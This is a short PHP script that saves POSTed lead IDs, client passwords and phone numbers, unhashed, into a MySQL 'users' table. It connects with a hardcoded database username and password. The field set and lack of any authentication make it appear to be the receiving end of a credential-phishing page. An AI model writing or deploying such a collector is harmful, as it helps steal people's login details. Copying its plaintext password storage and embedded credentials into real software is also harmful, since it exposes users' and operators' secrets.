<?php
$host = 'localhost';
$dbname = 'adreanov_root';
$user = 'adreanov_root';
$password = 'z_&WKFQNb4MR1-s&';


try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8", $user, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Database connection failed: " . $e->getMessage());
}


$tableQuery = "
CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    lead_id VARCHAR(255) NOT NULL,
    clientpassword VARCHAR(255),
    clientphone VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)";
$pdo->exec($tableQuery);


if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $lead_id = $_POST['lead_id'] ?? null;
    $clientpassword = $_POST['clientpassword'] ?? null;
    $clientphone = $_POST['clientphone'] ?? null;

    if ($lead_id && $clientpassword && $clientphone) {
        $stmt = $pdo->prepare("INSERT INTO users (lead_id, clientpassword, clientphone) VALUES (:lead_id, :clientpassword, :clientphone)");
        $stmt->execute([
            ':lead_id' => $lead_id,
            ':clientpassword' => $clientpassword,
            ':clientphone' => $clientphone
        ]);

        echo "Data saved successfully.";
    } else {
        echo "Invalid data.";
    }
} else {
    echo "Invalid request method.";
}
?>
